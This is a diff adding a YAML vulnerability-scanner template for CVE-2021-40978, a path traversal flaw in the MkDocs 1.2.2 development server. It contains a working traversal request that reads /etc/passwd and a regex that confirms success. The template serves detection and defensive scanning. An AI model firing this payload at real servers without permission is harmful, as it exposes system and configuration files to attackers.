@@ -1,0 +1,27 @@
+id: CVE-2021-40978
+info:
+  name: MkDocs Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MkDocs version 1.2.2 has an arbitrary file reading vulnerability in its built-in development server.
+    This allows attackers to read sensitive files such as configuration files.
+  reference:
+    - https://github.com/nisdn/CVE-2021-40978
+  classification:
+    cve-id: CVE-2021-40978
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(.*?):0:0:"
